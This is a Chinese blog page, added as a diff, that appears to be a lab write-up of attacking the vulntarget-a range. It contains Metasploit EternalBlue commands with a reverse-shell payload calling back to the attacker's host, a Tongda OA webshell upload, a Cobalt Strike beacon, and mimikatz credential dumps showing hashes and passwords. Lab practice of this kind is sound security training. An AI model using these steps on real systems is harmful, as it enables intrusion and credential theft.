@@ -1,0 +1,452 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>vulntarget-a靶场学习 | n0ne</title><meta name="author" content="n0ne"><meta name="copyright" content="n0ne"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="rgba(255, 255, 255, 0.6)"><meta name="description" content="vulntarget-a靶场拓扑结构  中间出现了问题对win7靶机ip进行了调整，调整win7ip：192.168.113.150 域成员-2016 修改网络，加入域就行了。登录的时候记得以域用户的身份登录 账号信息 账号：Administrator 密码：Admin@123 账号：balsec.com\win2016 密码：Admin#123 外围打点win7设备渗透 首先确认ip地址之后探寻">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulntarget-a靶场学习">
+<meta property="og:url" content="https://n0neme.top/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="n0ne">
+<meta property="og:description" content="vulntarget-a靶场拓扑结构  中间出现了问题对win7靶机ip进行了调整，调整win7ip：192.168.113.150 域成员-2016 修改网络，加入域就行了。登录的时候记得以域用户的身份登录 账号信息 账号：Administrator 密码：Admin@123 账号：balsec.com\win2016 密码：Admin#123 外围打点win7设备渗透 首先确认ip地址之后探寻">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://n0neme.top/images/covers/084531icbMy.jpg">
+<meta property="article:published_time" content="2026-05-07T15:37:07.000Z">
+<meta property="article:modified_time" content="2026-05-07T16:30:20.760Z">
+<meta property="article:author" content="n0ne">
+<meta property="article:tag" content="内网靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://n0neme.top/images/covers/084531icbMy.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "vulntarget-a靶场学习",
+  "url": "https://n0neme.top/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/",
+  "image": "https://n0neme.top/images/covers/084531icbMy.jpg",
+  "datePublished": "2026-05-07T15:37:07.000Z",
+  "dateModified": "2026-05-07T16:30:20.760Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "n0ne",
+      "url": "https://n0neme.top"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/images/123.jpg"><link rel="canonical" href="https://n0neme.top/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'rgba(13, 13, 13, 0.6)')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'rgba(255, 255, 255, 0.6)')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'vulntarget-a靶场学习',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/footer.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/images/covers/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91SNAFFUR-%E5%8A%A8%E6%BC%AB%E5%B0%91%E5%A5%B3.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/123.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/images/covers/084531icbMy.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/images/123.jpg" alt="Logo" loading='lazy'><span class="site-name">n0ne</span></a><a class="nav-page-title" href="/"><span class="site-name">vulntarget-a靶场学习</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">vulntarget-a靶场学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-07T15:37:07.000Z" title="发表于 2026-05-07 23:37:07">2026-05-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-07T16:30:20.760Z" title="更新于 2026-05-08 00:30:20">2026-05-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="vulntarget-a靶场"><a href="#vulntarget-a靶场" class="headerlink" title="vulntarget-a靶场"></a>vulntarget-a靶场</h1><h1 id="拓扑结构"><a href="#拓扑结构" class="headerlink" title="拓扑结构"></a>拓扑结构</h1><img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260508003019533.png" class="" title="image-20260508003019533" loading='lazy'>
+
+<p>中间出现了问题对win7靶机ip进行了调整，调整win7ip：192.168.113.150</p>
+<p><strong>域成员-2016</strong></p>
+<p>修改网络，加入域就行了。登录的时候记得以域用户的身份登录</p>
+<p><strong>账号信息</strong></p>
+<p>账号：Administrator</p>
+<p>密码：Admin@123</p>
+<p>账号：balsec.com\win2016</p>
+<p>密码：Admin#123</p>
+<h1 id="外围打点"><a href="#外围打点" class="headerlink" title="外围打点"></a>外围打点</h1><p>win7设备渗透</p>
+<p>首先确认ip地址之后探寻开设的端口</p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260505164218085-1778169646449-2.png" class="" title="image-20260505164218085" loading='lazy'>
+
+<p>能看到win7开启了4个端口</p>
+<h2 id="从445端口渗透"><a href="#从445端口渗透" class="headerlink" title="从445端口渗透"></a>从445端口渗透</h2><p>可以发现使用fscan扫描出来了ms17-010漏洞也就是经典的永恒之蓝</p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260506173249268-1778169646449-4.png" class="" title="image-20260506173249268" loading='lazy'>
+
+<p>那么接下来使用msf进行利用即可</p>
+<p>msfconsole   —–启动msf</p>
+<p>使用<code>use exploit/windows/smb/ms17_010_eternalblue</code>进行漏洞利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">sf &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 192.168.40.6</span><br><span class="line">RHOSTS =&gt; 192.168.40.6</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST 192.168.113.128</span><br><span class="line">[!] Unknown datastore option: LHOSTS. Did you mean RHOSTS?</span><br><span class="line">LHOSTS =&gt; 192.168.113.128</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; set LPORT 5555</span><br><span class="line">LPORT =&gt; 5555</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br><span class="line">[*] Started reverse TCP handler on 192.168.113.128:5555 </span><br><span class="line">[*] 192.168.40.6:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 192.168.40.6:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.24/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator &#x27;+&#x27; and &#x27;?&#x27; was replaced with &#x27;*&#x27; in regular expression</span><br><span class="line">[*] 192.168.40.6:445      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 192.168.40.6:445 - The target is vulnerable.</span><br><span class="line">[*] 192.168.40.6:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 192.168.40.6:445 - Connection established for exploitation.</span><br><span class="line">[+] 192.168.40.6:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 192.168.40.6:445 - CORE raw buffer dump (42 bytes)</span><br><span class="line">[*] 192.168.40.6:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br></pre></td></tr></table></figure>
+
+<p>设置靶机IP地址：<code>set RHOSTS 192.168.40.6</code><br>然后设置一下反弹shell的payload：<code>set payload windows/x64/meterpreter/bind_tcp</code><br>设置攻击机IP地址：<code>set LHOSTS 192.168.113.128</code><br>开始攻击：<code>run</code></p>
+<p>设置端口 :<code>set LPORT 5555</code></p>
+<p>启动shell发现有编码问题<code>CHCP 65001</code>设置一下，其中<code>65001</code>代表UTF-8代码页</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 500 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;ipconfig</span><br><span class="line">ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP ����</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">���������� Bluetooth ��������:</span><br><span class="line"></span><br><span class="line">   ý��״  . . . . . . . . . . . . : ý���ѶϿ�</span><br><span class="line">   �����ض��� DNS ��׺ . . . . . . . : </span><br></pre></td></tr></table></figure>
+
+<h2 id="通达oa漏洞利用"><a href="#通达oa漏洞利用" class="headerlink" title="通达oa漏洞利用"></a>通达oa漏洞利用</h2><img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260506182821230-1778169646449-3.png" class="" title="image-20260506182821230" loading='lazy'>
+
+<p>可以发现其中部署的服务通达oa系统寻找其漏洞</p>
+<p>使用oa-tools进行扫描</p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260506183038733-1778169646449-5.png" class="" title="image-20260506183038733" loading='lazy'>
+
+<p>上传木马即可</p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260506203908371-1778169646449-6.png" class="" title="image-20260506203908371" loading='lazy'>
+
+<p>使用工具利用漏洞即可上传木马，之后使用蚁剑连接。</p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260506203952091-1778169646449-7.png" class="" title="image-20260506203952091" loading='lazy'>
+
+<h2 id="cs上线"><a href="#cs上线" class="headerlink" title="cs上线"></a>cs上线</h2><p>上传cs木马到win7</p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260506222543633-1778169646449-8.png" class="" title="image-20260506222543633" loading='lazy'>
+
+<p>首先建立一个监听器，之后创造一个payload</p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260506221455347-1778169646449-9.png" class="" title="image-20260506221455347" loading='lazy'>
+
+<p>利用蚁剑上传文件然后执行这个文件即可。</p>
+<p>可以看到我们已经上传上去了1.exe文件</p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260506221648140-1778169646449-10.png" class="" title="image-20260506221648140" loading='lazy'>
+
+<p>在这里遇到了个问题生成载荷之后一直弹不上去，最后发现原因win7靶机需要和kali在同一网络中仅仅是相互能ping通是不行的，最终win7靶机ip：192.168.113.150</p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260506225435249-1778169646449-11.png" class="" title="image-20260506225435249" loading='lazy'>
+
+<p>弹上去之后可以在cs中进行后续操作。</p>
+<p>使用shell +指令进行操作</p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260506225910179-1778169646449-12.png" class="" title="image-20260506225910179" loading='lazy'>
+
+<p>在cs之中也能很简单的看到win7的明文账号和密码为win7 admin</p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260506230212425-1778169646449-17.png" class="" title="image-20260506230212425" loading='lazy'>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;ipconfig</span><br><span class="line">ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ethernet adapter Bluetooth ��������:</span><br><span class="line"></span><br><span class="line">   Media State . . . . . . . . . . . : Media disconnected</span><br><span class="line">   Connection-specific DNS Suffix  . : </span><br><span class="line"></span><br><span class="line">Ethernet adapter �������� 2:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : </span><br><span class="line">   Link-local IPv6 Address . . . . . : fe80::c873:12d8:e311:5cc6%13</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 10.0.20.98</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : </span><br><span class="line"></span><br><span class="line">Ethernet adapter ��������:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : localdomain</span><br><span class="line">   Link-local IPv6 Address . . . . . : fe80::a468:7da1:9b41:c7%11</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 192.168.40.6</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : </span><br><span class="line"></span><br><span class="line">Tunnel adapter isatap.&#123;88C7D474-A9AD-4240-ADA1-2ADAD30C0900&#125;:</span><br><span class="line"></span><br><span class="line">   Media State . . . . . . . . . . . : Media disconnected</span><br><span class="line">   Connection-specific DNS Suffix  . : </span><br><span class="line"></span><br><span class="line">Tunnel adapter isatap.&#123;C16C4D2C-F074-4634-A62D-2B70BC241EE5&#125;:</span><br><span class="line"></span><br><span class="line">   Media State . . . . . . . . . . . : Media disconnected</span><br><span class="line">   Connection-specific DNS Suffix  . : </span><br><span class="line"></span><br><span class="line">Tunnel adapter isatap.localdomain:</span><br><span class="line"></span><br><span class="line">   Media State . . . . . . . . . . . : Media disconnected</span><br><span class="line">   Connection-specific DNS Suffix  . : localdomain</span><br></pre></td></tr></table></figure>
+
+
+
+<p>发现了内部还有一个网卡ip为10.0.20.98</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
+
+<p>发现权限为system权限</p>
+<p>查看进程</p>
+<p>tasklist&#x2F;svc</p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260506181916672-1778169646449-13.png" class="" title="image-20260506181916672" loading='lazy'>
+
+<p><a target="_blank" rel="noopener" href="https://av.aabyss.cn/index.php">杀软在线识别-渊龙Sec安全团队</a></p>
+<p>在线杀软识别</p>
+<p><img src="/../../../../%25E5%25AD%25A6%25E4%25B9%25A0%25E8%25AE%25B0%25E5%25BD%2595/%25E9%259D%25B6%25E5%259C%25BA%25E6%25B8%2597%25E9%2580%258F%25E6%25B5%258B%25E8%25AF%2595/%25E5%259F%259F%25E6%25B8%2597%25E9%2580%258F/vulntarget-a/image-20260506182106116.png" alt="image-20260506182106116" loading='lazy'></p>
+<p>无杀毒软件</p>
+<p>接下来使用mimikataz模块继续获取更多信息。</p>
+<p>mimikataz模块是 Windows 内网渗透里最经典的凭证提取工具之一，核心作用就是：</p>
+<blockquote>
+<p>从内存、系统、票据里“掏”认证信息。</p>
+</blockquote>
+<p>比如：</p>
+<ul>
+<li>明文密码</li>
+<li>NTLM Hash</li>
+<li>Kerberos 票据</li>
+<li>域控凭证</li>
+<li>Token</li>
+<li>DPAPI 密钥</li>
+</ul>
+<p>执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p>可以从：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsass.exe</span><br></pre></td></tr></table></figure>
+
+<p>进程里读取登录凭证。</p>
+<p>可能看到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Username : administrator</span><br><span class="line">Password : 123456</span><br><span class="line">NTLM     : xxxxxxxxx</span><br></pre></td></tr></table></figure>
+
+<p>exit退出终端，加载模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;exit</span><br><span class="line">exit</span><br><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">Loading extension kiwi...</span><br><span class="line">  .#####.   mimikatz 2.2.0 20191125 (x64/windows)</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"></span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"></span><br><span class="line"> ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><br><span class="line"></span><br><span class="line"> &#x27;## v ##&#x27;        Vincent LE TOUX            ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/</span><br><span class="line"></span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; creds_all</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving all credentials</span><br><span class="line"></span><br><span class="line">msv credentials</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">Username  Domain   LM                                NTLM                              SHA1</span><br><span class="line"></span><br><span class="line">--------  ------   --                                ----                              ----</span><br><span class="line"></span><br><span class="line">win7      win7-PC  f0d412bd764ffe81aad3b435b51404ee  209c6174da490caeb422f3fa5a7ae634  7c87541fd3f3ef5016e12d411900c87a6046a8e8</span><br><span class="line"></span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Username  Domain     Password</span><br><span class="line"></span><br><span class="line">--------  ------     --------</span><br><span class="line"></span><br><span class="line">(null)    (null)     (null)</span><br><span class="line">WIN7-PC$  WORKGROUP  (null)</span><br><span class="line">win7      win7-PC    admin</span><br><span class="line"></span><br><span class="line">tspkg credentials</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">Username  Domain   Password</span><br><span class="line"></span><br><span class="line">--------  ------   --------</span><br><span class="line"></span><br><span class="line">win7      win7-PC  admin</span><br><span class="line"></span><br><span class="line">kerberos credentials</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Username  Domain     Password</span><br><span class="line"></span><br><span class="line">--------  ------     --------</span><br><span class="line"></span><br><span class="line">(null)    (null)     (null)</span><br><span class="line">win7      win7-PC    admin</span><br><span class="line">win7-pc$  WORKGROUP  (null)</span><br></pre></td></tr></table></figure>
+
+<p>可以看见win7密码为admin</p>
+<p>使用指令为 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line"></span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>根据前面收集到的信息win7上有两个网卡，所以需要搭建代理。</p>
